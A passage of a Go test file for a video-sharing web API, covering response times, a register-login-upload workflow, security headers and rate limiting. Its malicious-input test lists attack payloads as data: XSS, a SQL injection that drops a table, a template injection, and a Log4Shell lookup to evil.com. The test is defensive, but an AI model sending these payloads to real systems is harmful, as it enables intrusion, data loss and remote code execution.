	successRate := float64(successCount) / float64(numRequests)
	assert.GreaterOrEqual(t, successRate, 0.8, "Success rate should be at least 80%")
}

func TestResponseTimes(t *testing.T) {
	endpoints := []struct {
		name   string
		method string
		url    string
		useAuth bool
	}{
		{"Health check", "GET", "/health", false},
		{"Hello world", "GET", "/", false},
		{"User profile", "GET", "/api/user/me", true},
		{"Video list", "GET", "/api/video/list", true},
		{"Popular videos", "GET", "/api/video/popular", true},
	}

	for _, endpoint := range endpoints {
		t.Run(endpoint.name, func(t *testing.T) {
			start := time.Now()
			
			var resp *http.Response
			var err error
			if endpoint.useAuth {
				resp, err = makeAuthenticatedRequest(endpoint.method, endpoint.url, nil, nil)
			} else {
				resp, err = makeRequest(endpoint.method, endpoint.url, nil, nil)
			}
			
			duration := time.Since(start)
			
			require.NoError(t, err)
			defer resp.Body.Close()
			
			// Response time should be under 1 second for simple endpoints
			assert.Less(t, duration, 1*time.Second, "Response time should be under 1 second")
			
			// Status should be successful (2xx) or expected error status
			assert.True(t, resp.StatusCode < 500, "Should not have server errors")
		})
	}
}

// =============================================================================
// Integration Testing
// =============================================================================

func TestEndToEndUserVideoWorkflow(t *testing.T) {
	// 1. Register a new user
	newUser := users.CreateUserRequest{
		UserName: "workflowuser",
		Email:    "workflow@example.com",
		Password: "workflowpass123",
	}

	body, err := json.Marshal(newUser)
	require.NoError(t, err)

	resp, err := makeRequest("POST", "/user/register", bytes.NewReader(body), map[string]string{
		"Content-Type": "application/json",
	})
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, http.StatusOK, resp.StatusCode)

	responseBody, err := readResponseBody(resp)
	require.NoError(t, err)

	var registerResponse map[string]interface{}
	err = json.Unmarshal(responseBody, &registerResponse)
	require.NoError(t, err)

	workflowToken := registerResponse["token"].(string)
	assert.NotEmpty(t, workflowToken)

	// 2. Login with the new user
	loginPayload := users.LoginUserRequest{
		Email:    newUser.Email,
		Password: newUser.Password,
	}

	body, err = json.Marshal(loginPayload)
	require.NoError(t, err)

	resp, err = makeRequest("POST", "/user/login", bytes.NewReader(body), map[string]string{
		"Content-Type": "application/json",
	})
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, http.StatusOK, resp.StatusCode)

	// 3. Get user profile
	resp, err = makeRequest("GET", "/api/user/me", nil, map[string]string{
		"Authorization": "Bearer " + workflowToken,
	})
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, http.StatusOK, resp.StatusCode)

	// 4. Upload a video
	fields := map[string]string{
		"title":       "Workflow Test Video",
		"description": "Video uploaded in workflow test",
	}

	files := map[string][]byte{
		"video": []byte("workflow test video content"),
	}

	uploadBody, contentType, err := createMultipartRequest(fields, files)
	require.NoError(t, err)

	resp, err = makeRequest("POST", "/api/video/upload", uploadBody, map[string]string{
		"Authorization": "Bearer " + workflowToken,
		"Content-Type":  contentType,
	})
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, http.StatusCreated, resp.StatusCode)

	// 5. List videos to verify upload
	resp, err = makeRequest("GET", "/api/video/list", nil, map[string]string{
		"Authorization": "Bearer " + workflowToken,
	})
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, http.StatusOK, resp.StatusCode)
}

// =============================================================================
// Edge Cases and Security Testing
// =============================================================================

func TestSecurityHeaders(t *testing.T) {
	testCases := []struct {
		name string
		url  string
	}{
		{"Root endpoint", "/"},
		{"Health endpoint", "/health"},
		{"API endpoint", "/api/user/me"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			headers := map[string]string{}
			if strings.Contains(tc.url, "/api/") {
				headers["Authorization"] = "Bearer " + testToken
			}

			resp, err := makeRequest("GET", tc.url, nil, headers)
			require.NoError(t, err)
			defer resp.Body.Close()

			// Check for security-related headers
			assert.Contains(t, resp.Header.Get("Access-Control-Allow-Origin"), "*")
			// Fiber sets some security headers by default
		})
	}
}

func TestRateLimiting(t *testing.T) {
	// Make many requests quickly to test rate limiting
	const numRequests = 50
	successCount := 0
	rateLimitedCount := 0

	for i := 0; i < numRequests; i++ {
		resp, err := makeRequest("GET", "/", nil, nil)
		require.NoError(t, err)
		resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			successCount++
		} else if resp.StatusCode == http.StatusTooManyRequests {
			rateLimitedCount++
		}
	}

	// Should get at least some successful requests
	assert.Greater(t, successCount, 0, "Should have some successful requests")
	
	// With rate limiting configured, we might get rate limited
	// This test mainly verifies the endpoint handles high request volumes
	t.Logf("Successful requests: %d, Rate limited: %d", successCount, rateLimitedCount)
}

func TestMaliciousInputs(t *testing.T) {
	maliciousInputs := []string{
		"<script>alert('xss')</script>",
		"'; DROP TABLE users; --",
		strings.Repeat("A", 10000), // Very long string
		"{{constructor.constructor('return process')().exit()}}",
		"${jndi:ldap://evil.com/a}",
	}

	for i, input := range maliciousInputs {
		t.Run(fmt.Sprintf("Malicious input %d", i+1), func(t *testing.T) {
			payload := users.CreateUserRequest{
				UserName: input,
				Email:    "test@example.com",
				Password: "password123",
			}

			body, err := json.Marshal(payload)
			require.NoError(t, err)

			resp, err := makeRequest("POST", "/user/register", bytes.NewReader(body), map[string]string{
				"Content-Type": "application/json",
			})
			require.NoError(t, err)
			defer resp.Body.Close()

			// Should either succeed (if properly sanitized) or fail gracefully
			assert.True(t, resp.StatusCode < 500, "Should not cause server errors")
		})
	}
}
